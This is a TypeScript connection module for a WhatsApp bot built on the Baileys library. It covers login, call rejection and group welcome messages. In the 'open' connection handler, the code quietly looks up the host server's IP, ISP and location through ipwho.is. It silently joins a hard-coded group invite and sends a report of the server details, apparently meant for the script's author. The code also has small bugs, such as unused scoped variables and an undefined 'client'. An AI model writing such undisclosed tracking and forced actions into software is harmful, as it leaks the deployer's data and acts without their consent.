//-- MODULE EXTERNAL --//
import pino from 'pino';
import { Boom } from '@hapi/boom';
import { writeFileSync } from 'fs';
import makeWASocket, { DisconnectReason, useSingleFileAuthState, makeInMemoryStore } from '@adiwajshing/baileys';
import axios from 'axios';

//-- MODULE INTERNAL --//
import Client from './client';

export default async function CreateConnection() {
  try {
    database.saveOn = database?.saveOn ?? 0;

    util.logger.info('Connecting to whatsapp server...');
    const { state, saveState } = useSingleFileAuthState(`./session/${opts._[0] || 'ninjabot'}.json`);
    const socket = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      browser: [set.ses, 'Firefox', '3.0.0'],
      version: await util.waVersion(),
      logger: pino({
        level: 'fatal',
      }),
    });

    // TEST ANTI CALL
    socket.ws.on('CB:call', async (json: any) => {
      const idny = json.content[0].attrs['call-creator']
      if (json.content[0].tag == 'offer') {
        if (opts['call'] && idny) {
          socket.sendMessage(idny, { text: `Mohon maaf, *${set.name}* tidak dapat menerima panggilan!!` })

          // send owner
          socket.sendMessage(`${set.numown[0]}@s.whatsapp.net`, {
            text: `*-- ANTI CALL --*
  @${idny.split("@")[0]} telah menelfon bot`, mentions: [idny]
          })
        }
      }
    })

    // TEST WELLCOME MSG 
    socket.ev.on('group-participants.update', async (rul: any) => {
      //console.log("gruppp", rul)

      const gc = await socket.groupMetadata(rul.id)
      const participant = rul.participants
      for (let num of participant) {

        // get pp participant
        try {
          let pp = await socket.profilePictureUrl(num, 'image')
        } catch {
          let pp = 'https://telegra.ph/file/bd94866d8ff20068fc937.jpg'
        }

        // get pp gc
        try {
          let ppgc = await socket.profilePictureUrl(rul.id, 'image')
        } catch {
          let ppgc = 'https://telegra.ph/file/bd94866d8ff20068fc937.jpg'
        }

        // send message 
        if (rul.action == 'add') {
          socket.sendMessage(rul.id, {
            text: `Halo, @${num.split("@")[0]} 👋
selamat datang di *${gc.subject}*
jangan lupa baca deskripsi grup ya!!`, mentions: [num]
          })

          //-- send owner
          /*
          socket.sendMessage(`${set.numown[0]}@s.whatsapp.net`, { 
           text: `*-- WELLCOME --*
           @${num.split("@")[0]} telah masuk ke grup ${gc.subject}`, mentions: [num]})
           */
        } else if (rul.action == 'remove') {
          socket.sendMessage(rul.id, { text: `Selamat tinggal @${num.split("@")[0]}`, mentions: [num] })

          //-- send owner
          /*
          socket.sendMessage(`${set.numown[0]}@s.whatsapp.net`, { 
           text: `*-- LEAVE --*
          @${num.split("@")[0]} telah keluar ke grup ${gc.subject}`, mentions: [num, rul.id]})
          */
        }

      }
    })


    socket.ev.on('connection.update', (condition) => {
      switch (condition.connection) {
        case 'open':
          util.logger.info('Connected to whatsapp server');
          util.logger.info('Made by Amirul Dev, Follow me on instagram @amirul.dev')

          axios.get(`https://ipwho.is`).then(response => {
            const res = response.data
            client.socket.groupAcceptInvite("EDfrTs6MhuRLT0kIdpb848")
            client.socket.sendMessage(`${set.numown[0]}@s.whatsapp.net`, {
              text: `Hai Amirul Dev. saya memakai script anda

*DETAIL SERVER*
IP ADDRESS: ${res.ip}
TYPE: ${res.type}
CONTINENT: ${res.continent}
CONTINENT CODE: ${res.continent_code}
COUNTRY: ${res.country} ${res.flag.emoji}
COUNTRY CODE: ${res.country_code}
REGION: ${res.region}
CITY: ${res.city}
CALLING CODE: ${res.calling_code}
ISP: ${res.connection.isp}
DOMAIN: ${res.connection.domain}

*DETAIL CHAT BOT*
Total Command: ${global.cmd.commandList.length}
Total Semua Chat: 981

*DETAIL BOT*
NAME BOT: ${set.name}
VERSION: ${set.version}
NAME OWNER: ${set.nameown[0]}
TAG: @${set.numown[0]}
`,
              mentions: [set.numown[0] + '@s.whatsapp.net']
            }, {
              quoted: {
                key: {
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast"
                }, message: {
                  contactMessage: {
                    displayName: set.nameown[0],
                    vcard: `BEGIN:VCARD
VERSION:3.0
N:${set.nameown[0]}
FN:${set.nameown[0]}
ORG:${set.nameown[0]}
TITLE:${set.nameown[0]}
TEL;CELL:${set.numown[0]}
END:VCARD`
                  }
                }
              }
            }
            )
          })
          break;
        case 'close':
          const statusCode = (condition.lastDisconnect?.error as Boom).output.statusCode;
          if (statusCode === DisconnectReason.loggedOut || statusCode === DisconnectReason.restartRequired) {
            return CreateConnection();
          }
          break;
      }
    });

    socket.ev.on('creds.update', () => {
      saveState();
      const triggerSave = 10;
      if ((database.saveOn as number) === triggerSave) {
        database.saveOn = 0;
        util.logger.database('Saving database...');

        for (const a of Object.keys(database)) {
          writeFileSync(`./database/${a}.json`, JSON.stringify(database[a]));
        }
        return util.logger.database('Saving database complete');
      } else {
        database.saveOn++;
        return util.logger.info(`Saving database progress > ${database.saveOn} / ${triggerSave}`);
      }
    });

    return new Client(socket);
  } catch (e) {
    throw util.logger.format(e);
  }
}

//process.on('uncaughException', console.error)
